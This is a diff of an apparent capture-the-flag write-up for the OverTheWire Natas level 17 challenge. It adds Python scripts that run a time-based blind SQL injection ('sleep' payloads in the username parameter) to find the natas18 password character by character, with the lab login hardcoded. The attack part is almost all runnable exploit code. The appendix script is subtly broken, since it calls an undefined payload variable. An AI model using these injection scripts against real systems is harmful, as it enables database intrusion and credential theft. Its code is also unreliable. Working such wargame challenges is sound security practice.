@@ -32,6 +32,7 @@ natas17_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
 waiting_time = 3 # seconds
 sql_injection_time_based = "natas18\" and password like binary \"%{}%\" and sleep(" + str(waiting_time) + ");-- -"
 
+# GET HTTP details
 URL = "http://natas17.natas.labs.overthewire.org/?username={}"
 AUTH = HTTPBasicAuth(natas17_username, natas17_password)
 
@@ -41,15 +42,100 @@ for c in digits + ascii_letters:
     
     if(res.elapsed.seconds >= waiting_time):
         characters_in_use.append(c)
-        print("The password contains the following characters:")
-        print("".join(characters_in_use))
+        print("The password contains the following characters: " + ",".join(characters_in_use))
 ```
 
 This is the resoult:
 
 <img src="./2.png"></img>
 
+Now we can run the brute force on the relevant characters only:
+
+```python
+from requests import get
+from requests.auth import HTTPBasicAuth
+from string import digits, ascii_letters
+
+# cCurrent level details
+natas17_username = "natas17"
+natas17_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
+
+# The sql injection time based input:
+waiting_time = 3 # seconds
+sql_injection_time_based = "natas18\" and password like binary \"{}%\" and sleep(" + str(waiting_time) + ");-- -"
+relevant_characters = ['4','6','8','a','g','k','n','o','q','u','v','w','x','D','E','F','G','J','L','N','P','Q','U','V','Z']
+password = ""
+password_length = 32
+
+# GET HTTP details
+URL = "http://natas17.natas.labs.overthewire.org/?username={}"
+AUTH = HTTPBasicAuth(natas17_username, natas17_password)
+
+for _ in range(password_length):
+    for c in relevant_characters:
+        res = get(url=URL.format(sql_injection_time_based.format(password+c)), auth=AUTH)
+        
+        if(res.elapsed.seconds >= waiting_time):
+            password += c
+            print("Password: " + password.ljust(password_length, "_"))
+            break
+```
+
+<img src="./3.png"></img>
+
+And this is the password.
+
+
 ## Password for the next level:
 ```
 
+```
+
+## Appendix
+
+The following code sums it all up. Run it and enjoy:
+
+```python
+from requests import get
+from requests.auth import HTTPBasicAuth
+from string import digits, ascii_letters
+
+# cCurrent level details
+natas17_username = "natas17"
+natas17_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
+natas18_password = ""
+password_length = 32
+characters_in_use = []
+
+
+# The sql injection time based input:
+waiting_time = 3 # seconds
+sql_injection_recover_charecters = "natas18\" and password like binary \"%{}%\" and sleep(" + str(waiting_time) + ");-- -"
+sql_injection_recover_password = "natas18\" and password like binary \"{}%\" and sleep(" + str(waiting_time) + ");-- -"
+
+# GET HTTP details
+URL = "http://natas17.natas.labs.overthewire.org/?username={}"
+AUTH = HTTPBasicAuth(natas17_username, natas17_password)
+
+# Recover relevant characters
+print("Discovering the characters appearing in the password:")
+for c in digits + ascii_letters:
+    res = get(url=URL.format(sql_injection_recover_charecters.format(c)), auth=AUTH)
+    
+    if(res.elapsed.seconds >= waiting_time):
+        characters_in_use.append(c)
+        print("The password contains the following characters: " + ",".join(characters_in_use))
+
+# Revover the password
+print("Revealing the password")
+for _ in range(password_length):
+    for c in characters_in_use:
+        res = get(url=URL.format(sql_injection_time_based.format(natas18_password+c)), auth=AUTH)
+        
+        if(res.elapsed.seconds >= waiting_time):
+            natas18_password += c
+            print("Password: " + natas18_password.ljust(password_length, "_"))
+            break
+    
+print("Password for natas18 is: " + natas18_password)
 ```
